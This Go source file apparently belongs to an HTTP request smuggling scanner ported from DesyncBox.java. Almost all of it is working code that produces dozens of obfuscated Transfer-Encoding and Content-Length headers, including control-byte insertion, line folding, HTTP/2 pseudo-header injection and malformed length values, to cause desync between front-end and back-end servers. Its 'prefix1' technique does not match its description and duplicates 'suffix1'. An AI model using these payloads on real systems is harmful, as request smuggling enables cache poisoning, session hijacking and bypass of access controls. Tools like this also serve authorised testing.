// Package permute implements all Transfer-Encoding / Content-Length obfuscation
// techniques from DesyncBox.java. Each technique returns the mutated header string
// that replaces "Transfer-Encoding: chunked" (or the whole header line) in the raw
// request bytes.
//
// References:
//   - PortSwigger: https://portswigger.net/research/http-desync-attacks
//   - HTTP/1.1 Must Die: https://portswigger.net/research/http1-must-die
package permute

import (
	"bytes"
	"fmt"
	"strings"
)

// Technique represents a single TE obfuscation technique.
type Technique struct {
	Name        string
	H2Only      bool   // only applicable to HTTP/2 downgrade scenarios
	Description string
}

// All returns the full catalogue of techniques, mirroring DesyncBox.java.
func All() []Technique {
	base := []Technique{
		// ── Shared (H1 + H2) ────────────────────────────────────────────────
		{Name: "vanilla", Description: "Standard Transfer-Encoding: chunked"},
		{Name: "underjoin1", Description: "Transfer_Encoding: chunked"},
		{Name: "spacejoin1", Description: "Transfer Encoding: chunked"},
		{Name: "space1", Description: "Transfer-Encoding : chunked (space before colon)"},
		{Name: "nameprefix1", Description: "Foo: bar\\r\\n Transfer-Encoding: chunked"},
		{Name: "nameprefix2", Description: "Foo: bar\\r\\n\\t Transfer-Encoding: chunked"},
		{Name: "valueprefix1", Description: "Transfer-Encoding:  chunked (extra space after colon)"},
		{Name: "vertwrap", Description: "Transfer-Encoding: chunked\\n\\v"},
		{Name: "connection", Description: "Connection: Transfer-Encoding\\r\\nTransfer-Encoding: chunked"},
		{Name: "spjunk", Description: "Transfer-Encoding x: chunked (space-junk)"},
		{Name: "backslash", Description: "Transfer\\Encoding: chunked"},
		{Name: "spaceFF", Description: "Transfer-Encoding\\xFF: chunked"},
		{Name: "unispace", Description: "Transfer-Encoding\\xa0: chunked"},
		{Name: "commaCow", Description: "Transfer-Encoding: chunked, identity"},
		{Name: "cowComma", Description: "Transfer-Encoding: identity, chunked"},
		{Name: "contentEnc", Description: "Content-Encoding: chunked"},
		{Name: "quoted", Description: `Transfer-Encoding: "chunked"`},
		{Name: "aposed", Description: "Transfer-Encoding: 'chunked'"},
		{Name: "dualchunk", Description: "Transfer-encoding: identity + Transfer-Encoding: chunked"},
		{Name: "lazygrep", Description: "Transfer-Encoding: chunk"},
		{Name: "0dsuffix", Description: "Transfer-Encoding: chunked\\r"},
		{Name: "tabsuffix", Description: "Transfer-Encoding: chunked\\t"},
		{Name: "revdualchunk", Description: "Transfer-Encoding: identity\\r\\nTransfer-Encoding: chunked"},
		{Name: "nested", Description: "Transfer-Encoding: identity, chunked, identity"},
		{Name: "encode", Description: "Transfer-%45ncoding: chunked (URL-encoded E)"},
		{Name: "accentTE", Description: "Transf\\x82r-Encoding: chunked"},
		{Name: "accentCH", Description: "Transfer-Encoding: ch\\x96nked"},
		{Name: "removed", Description: "Transfer-Encoding header completely removed"},
		{Name: "get", Description: "Method changed to GET"},
		{Name: "options", Description: "Method changed to OPTIONS"},
		{Name: "head", Description: "Method changed to HEAD"},
		{Name: "range", Description: "Range: bytes=0-0 added"},
		{Name: "qencode", Description: "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?="},
		{Name: "qencodeutf", Description: "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?="},
		{Name: "nel", Description: "Transfer-Encoding\\u0085: chunked"},
		{Name: "nbsp", Description: "Transfer-Encoding\\u00a0: chunked"},
		{Name: "shy", Description: "Transfer\\u00adEncoding: chunked"},
		{Name: "shy2", Description: "Transfer-Encoding\\u00ad: chunked"},

		// ── H1-only ──────────────────────────────────────────────────────────
		{Name: "nospace1", Description: "Transfer-Encoding:chunked (no space)"},
		{Name: "linewrapped1", Description: "Transfer-Encoding:\\n chunked"},
		{Name: "doublewrapped", Description: "Transfer-Encoding:\\r\\n \\r\\n chunked"},
		{Name: "gareth1", Description: "Transfer-Encoding\\n :chunked"},
		{Name: "badsetupCR", Description: "Foo: bar\\rTransfer-Encoding: chunked"},
		{Name: "badsetupLF", Description: "Foo: bar\\nTransfer-Encoding: chunked"},
		{Name: "multiCase", Description: "tRANSFER-ENCODING: chunked"},
		{Name: "tabwrap", Description: "Transfer-Encoding: chunked\\r\\n\\t"},
		{Name: "UPPERCASE", Description: "TRANSFER-ENCODING: CHUNKED"},
		{Name: "0dwrap", Description: "Foo: bar\\r\\n\\rTransfer-Encoding: chunked"},
		{Name: "0dspam", Description: "Tra\\rnsfer-Encoding: chunked"},
		{Name: "badwrap", Description: "X-Blah-Ignore replaces TE; TE injected after first CRLF"},
		{Name: "bodysplit", Description: "TE injected inside another header value"},
		{Name: "h1case", Description: "TRANSFER-ENCODING: chunked (header name uppercased)"},
		{Name: "http1.0", Description: "HTTP/1.1 downgraded to HTTP/1.0"},

		// ── H2-only ───────────────────────────────────────────────────────────
		{Name: "http2hide", H2Only: true, Description: "TE hidden inside Foo header (H2 injection)"},
		{Name: "h2colon", H2Only: true, Description: "Transfer-Encoding`chunked : chunked"},
		{Name: "h2auth", H2Only: true, Description: ":authority injection before TE"},
		{Name: "h2path", H2Only: true, Description: ":path injection before TE"},
		{Name: "http2case", H2Only: true, Description: "lowercased headers + transfer-Encoding"},
		{Name: "h2scheme", H2Only: true, Description: ":scheme injection before TE"},
		{Name: "h2name", H2Only: true, Description: "Transfer-Encoding`chunked^~xz: x"},
		{Name: "h2method", H2Only: true, Description: ":method injection before TE"},
		{Name: "h2space", H2Only: true, Description: "Transfer-Encoding chunked : chunked"},
		{Name: "h2prefix", H2Only: true, Description: ":transfer-encoding: chunked"},
		{Name: "h2CL", H2Only: true, Description: "Content-Length: 0 added"},
	}

	// Dynamic spacefix1, prefix1, suffix1, namesuffix1 for each special char
	for _, i := range specialChars() {
		base = append(base,
			Technique{Name: fmt.Sprintf("spacefix1:%d", i), Description: fmt.Sprintf("space replaced with char 0x%02x before TE value", i)},
			Technique{Name: fmt.Sprintf("prefix1:%d", i), Description: fmt.Sprintf("char 0x%02x appended to TE header name", i)},
			Technique{Name: fmt.Sprintf("suffix1:%d", i), Description: fmt.Sprintf("char 0x%02x appended to TE value", i)},
			Technique{Name: fmt.Sprintf("namesuffix1:%d", i), Description: fmt.Sprintf("char 0x%02x before colon in TE header name", i)},
		)
	}

	// CL permutations (used in CL.TE context)
	base = append(base,
		Technique{Name: "CL-plus", Description: "Content-Length: +<n>"},
		Technique{Name: "CL-minus", Description: "Content-Length: -<n>"},
		Technique{Name: "CL-pad", Description: "Content-Length: 0<n>"},
		Technique{Name: "CL-bigpad", Description: "Content-Length: 00000000000<n>"},
		Technique{Name: "CL-e", Description: "Content-Length: <n>e0"},
		Technique{Name: "CL-dec", Description: "Content-Length: <n>.0"},
		Technique{Name: "CL-commaprefix", Description: "Content-Length: 0, <n>"},
		Technique{Name: "CL-commasuffix", Description: "Content-Length: <n>, 0"},
		Technique{Name: "CL-expect", Description: "Expect: 100-continue added"},
		Technique{Name: "CL-expect-obfs", Description: "Expect: x 100-continue"},
		Technique{Name: "CL-error", Description: "Invalid header injected before CL"},
		Technique{Name: "CL-spacepad", Description: "Content-Length: <n> (trailing space)"},
	)

	return base
}

// H1Techniques returns techniques that apply to HTTP/1.1 (non-H2-only).
func H1Techniques() []Technique {
	var out []Technique
	for _, t := range All() {
		if !t.H2Only {
			out = append(out, t)
		}
	}
	return out
}

// ApplyTE applies a named technique to the raw request bytes, mutating the
// Transfer-Encoding header (or the request structure as needed).
// Returns the mutated request, or nil if the technique had no effect.
func ApplyTE(req []byte, technique string) []byte {
	const teHeader = "Transfer-Encoding: "
	const teValue = "chunked"
	const teFull = "Transfer-Encoding: chunked"

	result := req

	switch technique {
	case "vanilla":
		return req

	case "underjoin1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer_Encoding: "))

	case "spacejoin1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer Encoding: "))

	case "space1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding : "))

	case "nameprefix1":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\r\n "+teHeader))

	case "nameprefix2":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\r\n\t"+teHeader))

	case "valueprefix1":
		result = replaceBytes(req, []byte(teHeader), []byte(teHeader+" "))

	case "nospace1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding:"))

	case "linewrapped1":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding:\n chunked"))

	case "doublewrapped":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding:\r\n \r\n chunked"))

	case "gareth1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding\n :"))

	case "badsetupCR":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\r"+teHeader))

	case "badsetupLF":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\n"+teHeader))

	case "vertwrap":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+"\n\x0b"))

	case "tabwrap":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+"\r\n\t"))

	case "multiCase":
		upper := strings.ToUpper(teHeader)
		mutated := strings.ToLower(upper[:1]) + upper[1:]
		result = replaceBytes(req, []byte(teHeader), []byte(mutated))

	case "UPPERCASE":
		result = replaceBytes(req, []byte(teHeader), []byte(strings.ToUpper(teHeader)))

	case "h1case":
		result = replaceBytes(req, []byte(teFull), []byte(strings.ToUpper(teHeader)+teValue))

	case "0dwrap":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\r\n\r"+teHeader))

	case "0dspam":
		result = replaceBytes(req, []byte("Tra"), []byte("Tra\r"))

	case "badwrap":
		tmp := replaceBytes(req, []byte(teHeader), []byte("X-Blah-Ignore: "))
		result = replaceFirstBytes(tmp, []byte("\r\n"), []byte("\r\n "+teFull+"\r\n"))

	case "bodysplit":
		tmp := replaceBytes(req, []byte(teFull), []byte("X: y"))
		tmp = addOrReplaceHeader(tmp, "Foo", "barzxaazz")
		result = replaceBytes(tmp, []byte("barzxaazz"), []byte("barn\n\n"+teFull))

	case "connection":
		result = replaceBytes(req, []byte(teHeader), []byte("Connection: Transfer-Encoding\r\n"+teHeader))

	case "spjunk":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding x: "))

	case "backslash":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer\\Encoding: "))

	case "nel":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding\u0085: "))

	case "nbsp":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding\u00a0: "))

	case "shy2":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding\u00ad: "))

	case "shy":
		result = replaceBytes(req, []byte("Transfer-Encoding"), []byte("Transfer\u00adEncoding"))

	case "commaCow":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+", identity"))

	case "cowComma":
		result = replaceBytes(req, []byte(teHeader), []byte(teHeader+"identity, "))

	case "contentEnc":
		result = replaceBytes(req, []byte(teHeader), []byte("Content-Encoding: "))

	case "quoted":
		result = replaceBytes(req, []byte(teFull), []byte(`Transfer-Encoding: "chunked"`))

	case "aposed":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: 'chunked'"))

	case "dualchunk":
		result = addOrReplaceHeader(req, "Transfer-encoding", "identity")

	case "lazygrep":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: chunk"))

	case "revdualchunk":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: identity\r\nTransfer-Encoding: chunked"))

	case "nested":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: identity, chunked, identity"))

	case "http2hide":
		result = replaceBytes(req, []byte(teFull), []byte("Foo: b\r\nTransfer-Encoding: chunked\r\nx: x"))

	case "encode":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-%45ncoding: chunked"))

	case "h2colon":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding`chunked : chunked"))

	case "http2case":
		lower := bytes.ToLower(req)
		result = replaceBytes(lower, []byte(strings.ToLower(teFull)), []byte("x-reject: 1\r\ntransfer-Encoding: chunked"))

	case "h2name":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding`chunked\r\nxz: x"))

	case "h2space":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding chunked : chunked"))

	case "h2prefix":
		result = replaceBytes(req, []byte(teFull), []byte(":transfer-encoding: chunked"))

	case "qencode":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?="))

	case "qencodeutf":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?="))

	case "0dsuffix":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+"\r"))

	case "tabsuffix":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+"\t"))

	case "removed":
		result = replaceBytes(req, []byte(teFull), []byte("Nothing-interesting: 1"))

	case "get":
		result = SetMethod(req, "GET")

	case "options":
		result = SetMethod(req, "OPTIONS")

	case "head":
		result = SetMethod(req, "HEAD")

	case "range":
		result = addOrReplaceHeader(req, "Range", "bytes=0-0")

	case "http1.0":
		result = replaceFirstBytes(req, []byte("HTTP/1.1"), []byte("HTTP/1.0"))

	case "h2CL":
		result = addOrReplaceHeader(req, "Content-Length", "0")
		return result

	case "spaceFF":
		oldHeader := []byte(teHeader)
		newHeader := make([]byte, len(oldHeader)-1)
		copy(newHeader, oldHeader[:len(oldHeader)-1])
		newHeader[len(newHeader)-1] = 0xFF
		result = replaceBytes(req, oldHeader, newHeader)

	case "unispace":
		oldHeader := []byte(teHeader)
		newHeader := make([]byte, len(oldHeader)-1)
		copy(newHeader, oldHeader[:len(oldHeader)-1])
		newHeader[len(newHeader)-1] = 0xa0
		result = replaceBytes(req, oldHeader, newHeader)

	case "accentTE":
		var buf bytes.Buffer
		buf.WriteString("Transf")
		buf.WriteByte(0x82)
		buf.WriteString("r-Encoding: ")
		result = replaceBytes(req, []byte(teHeader), buf.Bytes())

	case "accentCH":
		var buf bytes.Buffer
		buf.WriteString("Transfer-Encoding: ch")
		buf.WriteByte(0x96)
		result = replaceBytes(req, []byte("Transfer-Encoding: chu"), buf.Bytes())

	case "h2auth":
		host := extractHost(req)
		replacement := ":authority: " + host + ":443\r\n" + teFull + "\r\nx: x"
		result = replaceBytes(req, []byte(teFull), []byte(replacement))

	case "h2path":
		path := extractPath(req)
		replacement := ":path: " + path + " HTTP/1.1\r\n" + teFull + "\r\nx: x"
		result = replaceBytes(req, []byte(teFull), []byte(replacement))

	case "h2scheme":
		host := extractHost(req)
		path := extractPath(req)
		replacement := ":scheme: https://" + host + path + " HTTP/1.1\r\n" + teFull + "\r\nx: x"
		result = replaceBytes(req, []byte(teFull), []byte(replacement))

	case "h2method":
		path := extractPath(req)
		replacement := ":method: POST " + path + " HTTP/1.1\r\n" + teFull + "\r\nx: x"
		result = replaceBytes(req, []byte(teFull), []byte(replacement))

	default:
		// Dynamic techniques: spacefix1:N, prefix1:N, suffix1:N, namesuffix1:N
		for _, sc := range specialChars() {
			prefix := fmt.Sprintf("spacefix1:%d", sc)
			if technique == prefix {
				old := []byte(teHeader) // "Transfer-Encoding: "
				newH := append([]byte("Transfer-Encoding:"), byte(sc))
				result = replaceBytes(req, old, newH)
				goto done
			}
			if technique == fmt.Sprintf("prefix1:%d", sc) {
				old := []byte(teFull)
				newH := append([]byte(teFull), byte(sc))
				result = replaceBytes(req, old, newH)
				goto done
			}
			if technique == fmt.Sprintf("suffix1:%d", sc) {
				old := []byte(teFull)
				newH := append([]byte(teFull), byte(sc))
				result = replaceBytes(req, old, newH)
				goto done
			}
			if technique == fmt.Sprintf("namesuffix1:%d", sc) {
				result = replaceBytes(req, []byte("Transfer-Encoding:"), []byte("Transfer-Encoding"+string(rune(sc))+":"))
				goto done
			}
		}
	}

done:
	if bytes.Equal(result, req) && technique != "vanilla" {
		return nil // no effect — skip
	}
	return result
}

// ApplyCL applies a CL-mutation technique to the Content-Length header.
func ApplyCL(req []byte, technique, clValue string) []byte {
	const clHeader = "Content-Length: "

	switch technique {
	case "CL-plus":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"+"+clValue))
	case "CL-minus":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"-"+clValue))
	case "CL-pad":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"0"+clValue))
	case "CL-bigpad":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"00000000000"+clValue))
	case "CL-spacepad":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+" "))
	case "CL-e":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+"e0"))
	case "CL-dec":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+".0"))
	case "CL-commaprefix":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"0, "+clValue))
	case "CL-commasuffix":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+", 0"))
	case "CL-expect":
		return addOrReplaceHeader(req, "Expect", "100-continue")
	case "CL-expect-obfs":
		return addOrReplaceHeader(req, "Expect", "x 100-continue")
	case "CL-error":
		return replaceBytes(req, []byte(clHeader+clValue), []byte("X-Invalid Y: \r\n"+clHeader+clValue))
	}
	return req
}

// ─── Helpers ───────────────────────────────────────────────────────────────────

func replaceBytes(src, old, newB []byte) []byte {
	return bytes.Replace(src, old, newB, 1)
}

func replaceFirstBytes(src, old, newB []byte) []byte {
	idx := bytes.Index(src, old)
	if idx < 0 {
		return src
	}
	var buf bytes.Buffer
	buf.Write(src[:idx])
	buf.Write(newB)
	buf.Write(src[idx+len(old):])
	return buf.Bytes()
}

// addOrReplaceHeader adds or replaces a header in the raw HTTP request bytes.
func addOrReplaceHeader(req []byte, name, value string) []byte {
	headerLine := []byte(name + ": ")
	if idx := bytes.Index(bytes.ToLower(req), bytes.ToLower(headerLine)); idx >= 0 {
		// find end of that header line
		end := bytes.Index(req[idx:], []byte("\r\n"))
		if end < 0 {
			return req
		}
		var buf bytes.Buffer
		buf.Write(req[:idx])
		buf.WriteString(name + ": " + value)
		buf.Write(req[idx+end:])
		return buf.Bytes()
	}
	// insert before blank line separating headers from body
	sep := []byte("\r\n\r\n")
	idx := bytes.Index(req, sep)
	if idx < 0 {
		return req
	}
	var buf bytes.Buffer
	buf.Write(req[:idx])
	buf.WriteString("\r\n" + name + ": " + value)
	buf.Write(req[idx:])
	return buf.Bytes()
}

// SetMethod replaces the HTTP method in the request line.
func SetMethod(req []byte, method string) []byte {
	sp := bytes.IndexByte(req, ' ')
	if sp < 0 {
		return req
	}
	var buf bytes.Buffer
	buf.WriteString(method)
	buf.Write(req[sp:])
	return buf.Bytes()
}

// SetHeader sets a header value (adds if absent).
func SetHeader(req []byte, name, value string) []byte {
	return addOrReplaceHeader(req, name, value)
}

// GetHeader returns the value of a named header, or "".
func GetHeader(req []byte, name string) string {
	search := []byte(strings.ToLower(name) + ": ")
	lower := bytes.ToLower(req)
	idx := bytes.Index(lower, search)
	if idx < 0 {
		return ""
	}
	start := idx + len(search)
	end := bytes.Index(req[start:], []byte("\r\n"))
	if end < 0 {
		return string(req[start:])
	}
	return string(req[start : start+end])
}

func extractHost(req []byte) string {
	return GetHeader(req, "Host")
}

func extractPath(req []byte) string {
	parts := bytes.SplitN(req, []byte(" "), 3)
	if len(parts) < 2 {
		return "/"
	}
	return string(parts[1])
}

// specialChars returns the list of byte values used for dynamic permutations,
// mirroring DesyncBox.getSpecialChars().
func specialChars() []int {
	return []int{9, 10, 11, 12, 13, 28, 29, 30, 31, 32, 127, 160, 173}
}
